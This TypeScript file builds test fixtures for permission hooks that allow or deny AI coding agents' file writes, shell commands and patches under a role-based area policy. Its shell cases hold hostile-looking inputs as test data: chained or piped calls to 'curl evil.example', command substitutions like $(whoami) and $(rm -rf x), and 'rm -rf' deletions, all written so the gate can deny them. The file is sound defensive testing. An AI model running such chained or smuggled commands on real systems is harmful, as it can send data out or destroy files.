import { asCommitted, type Json } from "../output.ts";
import type { Reference } from "../reference.ts";
import { fixtureFile, fixturePath, type Case, type FixtureFile } from "./format.ts";

const NOW = "2026-01-15T12:00:00.000Z";
const CWD = "/fixture/repo";
const SESSION_SOURCES = ["apps/daemon/src/adapters/claude-code/hooks/pre-tool.ts", "apps/daemon/src/adapters/claude-code/hook-runner.ts"];
const EXEC_SOURCES = [...SESSION_SOURCES, "apps/daemon/src/adapters/claude-code/hooks/exec-filter.ts"];
const PATCH_SOURCES = ["apps/daemon/src/adapters/codex/patch.ts"];

type Authored = [name: string, why: string, input: { [key: string]: Json }];

const role = (grants: { read?: string[]; write?: string[]; exec?: string[] }): Json => ({ read: [], write: [], exec: [], ...grants });

/**
 * The policy that every `pre-tool` case runs against. `dev` may write `web` and `docs` and may run three commands. `builder` may
 * write `web` and has no exec list. `ops` may run one command and write nothing. `mem-ghost` has no role.
 */
const BUNDLE: Json = {
  version: 1,
  project_id: "prj-fixture",
  repos: ["app"],
  areas: [
    { name: "web", patterns: ["app:web/**"] },
    { name: "api", patterns: ["app:api/**"] },
    { name: "docs", patterns: ["*:docs/**"] },
    { name: "secrets", patterns: ["*:**/.env*"], private: true },
    { name: "system", patterns: ["*:.github/**", "*:.claude/**", "*:.codex/**", "*:.mcp.json"], system: true },
  ],
  roles: {
    dev: role({ read: ["web", "api"], write: ["web", "docs"], exec: ["npm test", "go build", "git status"] }),
    builder: role({ write: ["web"] }),
    ops: role({ exec: ["make deploy"] }),
  },
  members: { "mem-dev": "dev", "mem-builder": "builder", "mem-ops": "ops" },
};

const claudeHook = (tool: string, toolInput: Json): Json => ({
  session_id: "session-1",
  transcript_path: "/fixture/transcript.jsonl",
  cwd: CWD,
  permission_mode: "default",
  hook_event_name: "PreToolUse",
  tool_name: tool,
  tool_input: toolInput,
  tool_use_id: "toolu_01",
});

const codexHook = (tool: string, toolInput: Json): Json => ({
  session_id: "session-1",
  turn_id: "turn-1",
  transcript_path: null,
  cwd: CWD,
  model: "fixture-model",
  permission_mode: "default",
  hook_event_name: "PreToolUse",
  tool_name: tool,
  tool_input: toolInput,
  tool_use_id: "call_1",
});

const at = (path: string): string => `${CWD}/${path}`;
const bash = (command: string): Json => ({ command });
const patch = (...lines: string[]): string => ["*** Begin Patch", ...lines, "*** End Patch"].join("\n");

function hookDecision(output: string): "allow" | "deny" {
  if (output === "") return "allow";
  const verdict = (JSON.parse(output) as { hookSpecificOutput?: { permissionDecision?: string; additionalContext?: unknown } }).hookSpecificOutput;
  if (verdict?.permissionDecision === "deny" && verdict.additionalContext === undefined) return "deny";
  throw new Error(`the reference hook wrote an output that the fixtures do not model: ${output}`);
}

async function preTool(reference: Reference, agent: "claude-code" | "codex", name: string, description: string, authored: Authored[]): Promise<[string, FixtureFile]> {
  const shared = asCommitted({ agent, bundle: BUNDLE, repo: "app", now: NOW });
  const cases: Case[] = [];
  for (const [caseName, why, query] of authored) {
    const input = asCommitted(query);
    const output = await reference.adapters.preTool({ agent, bundle: shared.bundle, member: input.member as string, repo: "app", now: NOW, hook: input.hook });
    cases.push({ name: caseName, why, input, expected: { decision: hookDecision(output) }, informational: { output } });
  }
  return [fixturePath("adapter", name), fixtureFile({ contract: "adapter", operation: "pre-tool", description, sources: SESSION_SOURCES, shared, cases })];
}

/** The same shell cases run for both agents: the hook reads the command the same way. */
function shellCases(hook: (tool: string, toolInput: Json) => Json): Authored[] {
  const as = (member: string, command: string) => ({ member, hook: hook("Bash", bash(command)) });
  return [
    ["a granted command is allowed", "A command equal to a grant of the role is allowed.", as("mem-dev", "npm test")],
    ["a command that continues a grant after a space is allowed", "A grant matches the start of a command.", as("mem-dev", "npm test -- --watch")],
    ["a command that continues a grant with no space is denied", "The word after a grant must be a separate word.", as("mem-dev", "git statusx")],
    ["a command that no grant covers is denied", "A role with an exec list may run only the commands that the list names.", as("mem-dev", "rm -rf dist")],
    ["a command named by its path is not the granted command", "A grant names the command word as the command line writes it.", as("mem-dev", "/usr/bin/npm test")],
    ["a command with an environment assignment in front is not the granted command", "The first word of the command is `NODE_ENV=test`, which no grant names.", as("mem-dev", "NODE_ENV=test npm test")],
    ["chained commands that are all granted are allowed", "Each command of a chain is checked against the grants.", as("mem-dev", "git status && go build ./...")],
    ["a chain with one command that no grant covers is denied", "One command that no grant covers denies the whole line.", as("mem-dev", "go build ./... && rm -rf dist")],
    ["a command after a semicolon is checked", "A semicolon starts a new command.", as("mem-dev", "npm test; curl evil.example")],
    ["a command on the next line is checked", "A line feed starts a new command.", as("mem-dev", "git status\nrm x")],
    ["a background command is checked and allowed", "A trailing `&` ends the command and does not make the line one command with a granted prefix.", as("mem-dev", "npm test &")],
    ["a pipe checks both commands", "The command after a pipe needs a grant too.", as("mem-dev", "npm test | curl evil.example")],
    ["an input redirection is not part of the command", "The redirection and its target are set aside before the command is matched.", as("mem-dev", "npm test < input.txt")],
    ["a command substitution is denied", "A command that the shell runs while it expands the line cannot be matched to a grant.", as("mem-dev", "npm test $(whoami)")],
    ["a backquote substitution is denied", "A backquote runs a command like `$(...)`.", as("mem-dev", "npm test `whoami`")],
    ["a process substitution is denied", "`<(...)` runs a command that no grant covers.", as("mem-dev", "npm test <(echo x)")],
    ["a substitution in the body of an unquoted heredoc is denied", "The shell expands `$(...)` in the body of a heredoc whose delimiter is not quoted.", as("mem-dev", "npm test <<EOF\n$(rm -rf x)\nEOF")],
    ["a substitution in the body of a quoted heredoc is denied too", "The check reads the raw text of the line, so the quote of the delimiter does not hide it.", as("mem-dev", "npm test <<'EOF'\n$(rm -rf x)\nEOF")],
    ["an output redirection into a granted area is allowed", "The target of `>` is a write, and the role may write `web`.", as("mem-dev", "npm test > web/test.log")],
    ["an output redirection into an area that the role cannot write is denied", "The target of `>` is a write, and the role may not write `api`.", as("mem-dev", "npm test > api/test.log")],
    ["tee needs no grant and its file is judged as a write", "A bare `tee` only writes its arguments, which the path check judges.", as("mem-dev", "npm test 2>&1 | tee web/test.log")],
    ["tee into an area that the role cannot write is denied", "The file of `tee` is a write, and the role may not write `api`.", as("mem-dev", "npm test | tee api/test.log")],
    ["a role with no exec list may run any command", "Without an exec list the commands of the member are not limited.", as("mem-builder", "ls -la")],
    ["a member with no role may run any command", "Without a role the commands of the member are not limited.", as("mem-ghost", "ls -la")],
    ["a command that the exec list names is allowed for a role that cannot write", "The exec list and the write list are separate.", as("mem-ops", "make deploy")],
    ["a command that the exec list does not name is denied", "A role that has an exec list may run only what it names.", as("mem-ops", "make clean")],
    ["a granted command that writes where the role cannot is denied", "The grant of the command does not open the target of its redirection.", as("mem-ops", "make deploy > web/out.txt")],
    ["sed -i on a file in a granted area is allowed", "`sed -i` writes its file operands.", as("mem-builder", "sed -i s/a/b/ web/app.ts")],
    ["sed -i on a file in an area that the role cannot write is denied", "`sed -i` writes its file operands.", as("mem-builder", "sed -i s/a/b/ api/server.ts")],
    ["sed without -i writes nothing", "`sed` with no `-i` reads its file operands.", as("mem-builder", "sed s/a/b/ api/server.ts")],
    ["cp checks only its destination", "`cp` writes its destination and reads its sources.", as("mem-builder", "cp api/server.ts web/server.ts")],
    ["cp into an area that the role cannot write is denied", "`cp` writes its destination.", as("mem-builder", "cp web/app.ts api/app.ts")],
    ["touch in the system area is denied", "No role may write a system area.", as("mem-builder", "touch .github/ci.yml")],
    ["rm of a file in a granted area is allowed", "`rm` removes its arguments, which counts as a write.", as("mem-builder", "rm -rf web/old")],
    ["mkdir in an area that the role cannot write is denied", "`mkdir` creates its arguments.", as("mem-builder", "mkdir -p api/new")],
    ["a write outside the project is not checked", "The policy governs the files of the project.", as("mem-builder", "echo hi > /tmp/out.txt")],
    ["a read writes nothing", "A command with no write target needs no path check.", as("mem-builder", "cat api/server.ts")],
    ["a target with a variable is not checked", "A word that the shell decides at run time cannot be judged.", as("mem-builder", "echo hi > web/$NAME")],
    ["a redirection of a member with no role is denied", "A member with no role may write nothing.", as("mem-ghost", "echo hi > web/app.ts")],
  ];
}

function claudeCode(reference: Reference): Promise<[string, FixtureFile]> {
  const write = (member: string, tool: string, path: string, extra: Json = {}): { member: string; hook: Json } => ({
    member,
    hook: claudeHook(tool, { file_path: path, ...(tool === "Write" ? { content: "x" } : { old_string: "a", new_string: "b" }), ...extra }),
  });
  const authored: Authored[] = [
    ["a write to a file in a granted area is allowed", "A role that lists the area under write may write there.", write("mem-dev", "Write", at("web/app.ts"))],
    ["a write to an area that the role does not grant is denied", "A role may write only in the areas that it lists.", write("mem-dev", "Write", at("api/server.ts"))],
    ["a write to a path in no area is denied", "A write of a path that no area matches is denied by default.", write("mem-dev", "Write", at("scripts/build.sh"))],
    ["a write to a system area is denied", "No role may write a system area.", write("mem-dev", "Write", at(".github/workflows/ci.yml"))],
    ["a write to the settings of the agent is denied", "The settings of Claude Code are in the system area.", write("mem-dev", "Write", at(".claude/settings.json"))],
    ["a write by a member with no role is denied", "A member that the bundle does not list has no grants.", write("mem-ghost", "Write", at("web/app.ts"))],
    ["a write that a private area refuses is denied although another area allows it", "A private area that denies the write decides, whatever else matches.", write("mem-dev", "Write", at("web/.env"))],
    ["an edit in a granted area is allowed", "The Edit tool is judged like the Write tool.", write("mem-dev", "Edit", at("web/app.ts"))],
    ["an edit in an area that the role does not grant is denied", "The Edit tool is judged like the Write tool.", write("mem-dev", "Edit", at("api/server.ts"))],
    ["a relative path is read from the working directory", "A path that is not absolute is relative to `cwd`.", write("mem-dev", "Write", "web/app.ts")],
    ["a relative path in an area that the role does not grant is denied", "A path that is not absolute is relative to `cwd`.", write("mem-dev", "Write", "api/server.ts")],
    ["a leading ./ is dropped", "`./web/app.ts` is the path `web/app.ts`.", write("mem-dev", "Write", "./web/app.ts")],
    ["a path with a doubled slash is read as written", "The hook cuts the working directory off the front and keeps the rest of the text, so `web//app.ts` is judged by the policy, which merges the slashes.", write("mem-dev", "Write", at("web//app.ts"))],
    ["an absolute path outside the project is not checked", "The policy governs the files of the project, and not the files under the home directory of the user.", write("mem-dev", "Write", "/home/dev/.claude/plans/plan.md")],
    ["an absolute path that climbs out of the working directory is not checked", "A path that leaves the working directory is outside the project.", write("mem-dev", "Write", at("../other/x.ts"))],
    ["a relative path that climbs out of the working directory is not checked", "A path that leaves the working directory is outside the project.", write("mem-dev", "Write", "../other/x.ts")],
    ["a path in a sibling directory with the same prefix is not inside the working directory", "`/fixture/repository/x.ts` does not start with `/fixture/repo/`.", write("mem-dev", "Write", "/fixture/repository/web/x.ts")],
    ...shellCases(claudeHook),
  ];
  return preTool(reference, "claude-code", "claude-code-pre-tool", "The PreToolUse hook of Claude Code for the tools Write, Edit, and Bash.", authored);
}

function codex(reference: Reference): Promise<[string, FixtureFile]> {
  const apply = (member: string, text: string) => ({ member, hook: codexHook("apply_patch", { command: text }) });
  const authored: Authored[] = [
    ["an added file in a granted area is allowed", "A patch that adds a file is a write.", apply("mem-dev", patch("*** Add File: web/new.ts", "+export const a = 1;"))],
    ["an updated file in an area that the role does not grant is denied", "A patch that updates a file is a write.", apply("mem-dev", patch("*** Update File: api/server.ts", "@@", "-a", "+b"))],
    ["a deleted file in the system area is denied", "No role may write a system area, and a delete is a write.", apply("mem-dev", patch("*** Delete File: .github/workflows/ci.yml"))],
    ["a file that a patch moves into an area that the role does not grant is denied", "The target of a move is a write.", apply("mem-dev", patch("*** Update File: web/a.ts", "*** Move to: api/a.ts", "@@", "-a", "+b"))],
    ["a file that a patch moves out of an area that the role does not grant is denied", "The source of a move is a write too.", apply("mem-dev", patch("*** Update File: api/a.ts", "*** Move to: web/a.ts", "@@", "-a", "+b"))],
    ["a patch with one file that is not granted is denied", "Every path of a patch must be allowed.", apply("mem-dev", patch("*** Add File: web/ok.ts", "+a", "*** Add File: api/no.ts", "+b"))],
    ["a patch with several files that are all granted is allowed", "Every path of a patch is checked, and all of them pass.", apply("mem-dev", patch("*** Add File: web/a.ts", "+a", "*** Update File: docs/b.md", "@@", "-x", "+y"))],
    ["a patch in a heredoc wrapper is read", "Codex accepts a patch inside a `<<EOF` wrapper.", apply("mem-dev", ["<<EOF", patch("*** Add File: api/h.ts", "+h"), "EOF"].join("\n"))],
    ["a patch that has no end marker is denied", "A patch that the gate cannot read is refused, because its targets are unknown.", apply("mem-dev", "*** Begin Patch\n*** Add File: web/a.ts\n+a")],
    ["a patch with an empty path is denied", "A header with no path is not a patch that Codex accepts.", apply("mem-dev", patch("*** Add File: ", "+a"))],
    ["text that is not a patch is denied", "An `apply_patch` call with other text is refused.", apply("mem-dev", "echo hi > web/x.txt")],
    ["a patch header that Codex trims is still read", "Codex trims white space around a header, so the gate does too.", apply("mem-dev", patch("  *** Add File: api/p.ts  ", "+a"))],
    ["a line that only looks like a header is not read", "A line inside a hunk that starts with a space is a context line.", apply("mem-dev", patch("*** Update File: web/a.ts", "@@", " *** Add File: api/x.ts", "-a", "+b"))],
    ["an absolute path in a patch is read from the working directory", "An absolute path inside the working directory is the path under it.", apply("mem-dev", patch(`*** Add File: ${at("api/abs.ts")}`, "+a"))],
    ["a path outside the project in a patch is not checked", "The policy governs the files of the project.", apply("mem-dev", patch("*** Add File: /tmp/scratch.txt", "+a"))],
    ["a patch by a member with no role is denied", "A member that the bundle does not list has no grants.", apply("mem-ghost", patch("*** Add File: web/a.ts", "+a"))],
    ...shellCases(codexHook),
  ];
  return preTool(reference, "codex", "codex-pre-tool", "The PreToolUse hook of Codex for the tools Bash and apply_patch.", authored);
}

function pure<T extends Json>(name: string, operation: string, description: string, sources: string[], authored: Authored[], run: (input: { [key: string]: Json }) => T): [string, FixtureFile] {
  const cases = authored.map(([caseName, why, query]): Case => {
    const input = asCommitted(query);
    return { name: caseName, why, input, expected: run(input) as Json };
  });
  return [fixturePath("adapter", name), fixtureFile({ contract: "adapter", operation, description, sources, cases })];
}

const cmd = (name: string, why: string, command: string): Authored => [name, why, { command }];

function bashTargets(reference: Reference): [string, FixtureFile] {
  const authored: Authored[] = [
    cmd("a redirection target is a write", "The word after `>` is a write target.", "echo hi > web/a.ts"),
    cmd("an append is a write", "The word after `>>` is a write target.", "echo hi >> web/log.txt"),
    cmd("a command with no write has no target", "A command that only reads names no target.", "cat web/a.ts"),
    cmd("an input redirection is not a write", "The word after `<` is read.", "sort < web/in.txt > web/out.txt"),
    cmd("a here-string is not a write", "The word after `<<<` is data.", "cat <<< hi > o.txt\nrm q"),
    cmd("quoted separators do not split a command", "A `;` inside quotes belongs to the word.", `git commit -m "a; rm x" && touch web/a.ts`),
    cmd("a line feed splits a command", "A line feed starts the next command.", "echo a\nrm web/b.ts"),
    cmd("fd duplication and closing are not targets", "`2>&1` and `2>&-` name a descriptor.", "npm test 2>&1 >out.txt 2>&- &>all.log"),
    cmd("a heredoc with a quoted delimiter has a body that is data", "No line of the body is a command.", "cat > notes.md <<'EOF'\nrm src/core/a.ts\nmkdir build\n> quoted line\nEOF"),
    cmd("a heredoc with an unquoted delimiter has a body that is data", "No line of the body is a command.", "cat > s.sh <<EOF\ntouch web/x\nEOF"),
    cmd("a command after a heredoc is read", "The body ends at the delimiter line.", "cat > web/setup.sh <<'EOF'\nmkdir -p build\nrm -rf dist\nEOF\ntouch web/after.txt"),
    cmd("<<- strips the tabs of the delimiter line", "With `<<-` the delimiter line may start with tabs.", "cat <<-EOF > a.txt\n\trm x\n\tEOF\nrm b"),
    cmd("<< does not strip the tabs of the delimiter line", "With `<<` a delimiter line that starts with a tab is part of the body.", "cat <<EOF > a.txt\nrm x\n\tEOF\nEOF\nrm b"),
    cmd("two heredocs on one line have their bodies in order", "Each body ends at its own delimiter.", 'cat <<A >a.txt; cat <<"B" >b.txt\nrm x\nA\nrm y\nB\nrm z'),
    cmd("a heredoc body with carriage returns ends at its delimiter", "A carriage return before the line feed is not part of the delimiter.", "cat <<EOF\r\nrm x\r\nEOF\r\nrm y"),
    cmd("sed -i writes its file operand and not its script", "The first operand of `sed -i` with no `-e` is the script.", "sed -i 's/foo/bar/' web/a.ts"),
    cmd("sed -i with a backup suffix writes every file operand", "`-i.bak` is in-place with a suffix.", "sed -i.bak 's/foo/bar/' web/a.ts web/b.ts"),
    cmd("sed -i with -e writes every operand", "With `-e` the operands are all files.", "sed -i -e 's/foo/bar/' -e 's/x/y/' web/a.ts"),
    cmd("sed -i with -f writes every operand", "With `-f` the operands are all files.", "sed -n -i -f script.sed web/a.ts"),
    cmd("sed with no -i writes nothing", "Without `-i` the operands are read.", "sed 's/foo/bar/' web/a.ts"),
    cmd("an awk program is not a path", "Awk writes nothing unless it redirects.", "awk '{print $1}' web/a.ts"),
    cmd("cp writes its destination", "The last operand of `cp` is the destination.", "cp README.md web/x.md"),
    cmd("cp with many sources writes the last operand", "The last operand of `cp` is the destination.", "cp -r a b web/"),
    cmd("mv writes its destination", "The last operand of `mv` is the destination.", "mv src/core/a.ts web/a.ts"),
    cmd("ln writes its destination", "The last operand of `ln` is the destination.", "ln -s src/core/a.ts web/link"),
    cmd("cp -t names the destination directory", "`-t` gives the destination before the sources.", "cp -t web/ src/core/a.ts src/core/b.ts"),
    cmd("install writes its destination and skips the mode", "`-m` takes a value that is not a path.", "install -m 755 build/tool web/tool"),
    cmd("install -d writes every operand", "`-d` makes directories.", "install -d web/a web/b"),
    cmd("cp with one operand has no target", "The gate does not guess a target.", "cp onlyone"),
    cmd("several commands each name their targets", "Redirections and commands on one line all count.", "echo hi > src/core/a.ts && rm web/old.ts; touch -d yesterday web/n.ts"),
    cmd("truncate writes its file", "`-s` takes a value that is not a path.", "truncate -s 0 web/log.txt"),
    cmd("tee writes its operands", "Every operand of `tee` is a file.", "tee -a web/log.txt"),
    cmd("a target with a variable is left out", "A word that the shell decides at run time cannot be judged.", "touch web/$NAME web/fixed.txt"),
    cmd("a target with a command substitution is left out", "A word that the shell decides at run time cannot be judged.", "rm $(ls) web/x"),
    cmd("a program named by its path is read by its last segment", "`/bin/rm` is `rm`.", "/bin/rm web/a.ts"),
    cmd("the same target twice is listed once", "The list has no repeats.", "touch web/a.ts web/a.ts"),
    cmd("a flag that takes a value skips the value", "`touch -d` takes a date.", "touch -d 2020-01-01 web/a.ts"),
    cmd("an option terminator makes the rest operands", "After `--` a word that starts with `-` is a path.", "rm -- -weird"),
    cmd("mkdir skips the mode", "`-m` takes a value that is not a path.", "mkdir -m 755 web/new"),
    cmd("a quoted target is read without its quotes", "Quotes and escapes are removed from a word.", `echo hi > "web/a b.txt"`),
    cmd("an escaped space joins a word", "A backslash before a space keeps the word together.", "touch web/a\\ b.txt"),
    cmd("a pipe starts a new command", "The command after `|` has its own targets.", "cat web/a.ts | tee web/b.ts"),
    cmd("a background marker starts a new command", "The command after `&` has its own targets.", "sleep 1 & rm web/c.ts"),
    cmd("a redirection that has no target ends the line", "A redirection operator at the end names no path.", "echo hi >"),
    cmd("an unclosed quote runs to the end of the line", "The word holds the rest of the line.", `echo hi > "web/a.ts`),
  ];
  return pure("bash-targets", "bash-targets", "The paths that a shell command writes, read from the command text.", SESSION_SOURCES, authored, (input) => ({
    targets: reference.adapters.bashTargets(input.command as string),
  }));
}

function execSegments(reference: Reference): [string, FixtureFile] {
  const authored: Authored[] = [
    cmd("one command is one segment", "A command with no separator is one segment.", "npm test"),
    cmd("a pipe and a redirection", "The redirection and its target are set aside, and the pipe splits.", "npm test 2>&1 | tee out.txt"),
    cmd("separators of every kind split", "`&&`, `||`, `;`, `|`, `|&`, `&`, and a line feed all split.", "a && b || c; d | e |& f & g\nh"),
    cmd("an input redirection is set aside with its target", "The target of `<` is not a word of the command.", "npm test < input.txt && git status > s.txt\nls &"),
    cmd("quoted separators stay in the word", "A separator inside quotes belongs to the word.", `git commit -m "fix; tidy" && npm test -- --grep 'a|b'`),
    cmd("redirections in the middle are set aside", "An operator and its target can come anywhere in the command.", "npm test >x extra 2>&- &> log"),
    cmd("an empty line has no segment", "A line that holds only separators has no command.", " ; && "),
    cmd("a heredoc body is not a segment", "The body of a heredoc is data.", "cat <<EOF\nrm -rf x\nEOF\nls"),
    cmd("the delimiter of a heredoc is not a word", "The delimiter is the target of `<<`.", "cat <<'EOF' > out.txt\nbody\nEOF"),
    cmd("a here-string target is not a word", "The target of `<<<` is data.", "cat <<< hello"),
    cmd("single quotes keep a backslash", "Inside single quotes a backslash is a character.", "echo 'a\\b'"),
    cmd("double quotes drop the backslash of an escape", "A backslash in double quotes escapes the next character.", 'echo "a\\"b"'),
    cmd("an escaped separator stays in the word", "A backslash before `;` keeps it in the word.", "echo a\\;b"),
    cmd("an escaped line feed joins the lines", "A backslash before a line feed continues the line.", "npm \\\ntest"),
    cmd("a path as the command word is kept", "The command word is not shortened to its last segment.", "/usr/bin/npm test"),
    cmd("an environment assignment is the first word", "The assignment is a word of the command.", "NODE_ENV=test npm test"),
    cmd("a word with a variable is kept as written", "The gate does not expand a variable.", "npm test $HOME"),
    cmd("a command substitution is kept as written", "The gate does not run a substitution.", "echo $(whoami)"),
    cmd("an fd duplication is dropped", "`2>&1` is not a word.", "npm test 2>&1"),
    cmd("a bare >& is a redirection with a target", "`>&` followed by a name redirects to a file.", "npm test >& out.txt"),
  ];
  return pure("exec-segments", "exec-segments", "The commands of a shell line, split the way the exec check reads it.", EXEC_SOURCES, authored, (input) => ({
    segments: reference.adapters.commandSegments(input.command as string),
  }));
}

function patchTargets(reference: Reference): [string, FixtureFile] {
  const one = (name: string, why: string, text: string): Authored => [name, why, { patch: text }];
  const authored: Authored[] = [
    one("every added, updated, deleted, and moved path is listed in patch order", "The list holds each path once, in the order of its first mention.", patch("*** Add File: web/new.ts", "+export const a = 1;", "*** Update File: src/old.ts", "*** Move to: src/renamed.ts", "@@", "-a", "+b", "*** Delete File: web/gone.ts", "*** Update File: web/new.ts", "@@", "+export const b = 2;")),
    one("a patch with CRLF line ends is read", "Codex reads a line that ends in a carriage return and a line feed.", patch("*** Update File: a.ts", "+*** Add File: not-a-header.ts").replace(/\n/g, "\r\n")),
    one("headers with white space around them are read", "Codex trims a header line, and a context line that looks like a header is not a header.", patch("  *** Add File: web/a.ts", "+x", "\t*** Update File: src/core/b.ts  ", "*** Move to: src/core/c.ts\t", " *** Delete File: d.ts")),
    one("a patch in a heredoc wrapper is read", "Codex accepts `<<EOF` and a closing line around a patch.", ["<<EOF", patch("*** Add File: web/h.ts", "+h"), "EOF"].join("\n")),
    one("a quoted heredoc wrapper is read", "Codex accepts `<<'EOF'` too.", ["<<'EOF'", patch("*** Add File: web/h.ts", "+h"), "EOF"].join("\n")),
    one("an environment line before the first hunk is skipped", "Codex accepts `*** Environment ID:` first.", patch("*** Environment ID: e1", "*** Add File: web/e.ts", "+e")),
    one("an end-of-file line ends a chunk", "`*** End of File` closes the chunk.", patch("*** Update File: a.ts", "@@", "-o", "+p", "*** End of File", "*** Delete File: b.ts")),
    one("a blank line between chunks is skipped", "Codex skips a blank line after a chunk.", patch("*** Update File: a.ts", "@@", "-o", "", "*** Add File: c.ts", "+y")),
    one("a blank line inside an add hunk ends the patch as invalid", "A blank line is not a `+` line, and it is not a header.", patch("*** Add File: a.ts", "+x", "", "*** Delete File: b.ts")),
    one("an update hunk with no chunk is invalid", "A header with no change under it is not a patch that Codex accepts.", patch("*** Update File: a.ts", "*** Add File: c.ts", "+y")),
    one("a second chunk with no @@ is invalid", "Only the first chunk may leave out `@@`.", patch("*** Update File: a.ts", "@@", "-a", "x b")),
    one("an empty string is not a patch", "A patch needs its markers.", ""),
    one("a shell command is not a patch", "A patch needs its markers.", "echo hi > x.txt"),
    one("a header with no path is invalid", "A path is required.", "*** Add File: "),
    one("a patch with no hunk is invalid", "A patch holds at least one hunk.", patch()),
    one("a patch with only an environment line is invalid", "A patch holds at least one hunk.", patch("*** Environment ID: e1")),
    one("a patch with no end marker is invalid", "A patch ends with its marker.", "*** Begin Patch\n*** Add File: a.ts\n+a"),
    one("a patch with no begin marker is invalid", "A patch starts with its marker.", "*** Add File: a.ts\n+a\n*** End Patch"),
    one("a move line with no path is invalid", "The path of a move is required.", patch("*** Update File: a.ts", "*** Move to: ", "@@", "-a", "+b")),
    one("a move line that is not the first line of the hunk is invalid", "Only the line after the header may move the file.", patch("*** Update File: a.ts", "@@", "-a", "+b", "*** Move to: b.ts")),
    one("a path with white space inside is kept", "Only the ends of a path are trimmed.", patch("*** Add File: web/a b.ts", "+a")),
    one("a path is trimmed with the white space that Codex trims", "Codex trims with the Unicode white space set, which includes U+0085.", patch("*** Add File: \u0085web/a.ts\u0085", "+a")),
    one("an add hunk with no body is valid", "An empty file has no `+` line.", patch("*** Add File: web/empty.ts")),
    one("a delete hunk is valid with no body", "A delete has no lines under it.", patch("*** Delete File: web/old.ts")),
    one("an unknown header is invalid", "Only add, update, and delete are hunks.", patch("*** Rename File: a.ts")),
    one("text after the end marker is invalid", "The end marker is the last line.", patch("*** Add File: a.ts", "+a") + "\nextra"),
    one("white space around the whole patch is trimmed", "Codex trims the patch text.", `\n\n  ${patch("*** Add File: a.ts", "+a")}  \n\n`),
    one("the same file added and updated is listed once", "The list has no repeats.", patch("*** Add File: a.ts", "+a", "*** Update File: a.ts", "@@", "+b")),
    one("a context line, a removed line, and an added line make a chunk", "A chunk line starts with a space, `-`, or `+`.", patch("*** Update File: a.ts", "@@ func main", " keep", "-old", "+new")),
  ];
  return pure("patch-targets", "patch-targets", "The paths that a Codex apply_patch call touches, read the way Codex reads the patch.", PATCH_SOURCES, authored, (input) => ({
    targets: reference.adapters.parsePatch(input.patch as string),
  }));
}

export async function adapterHookFixtures(reference: Reference): Promise<[string, FixtureFile][]> {
  return [await claudeCode(reference), await codex(reference), bashTargets(reference), execSegments(reference), patchTargets(reference)];
}
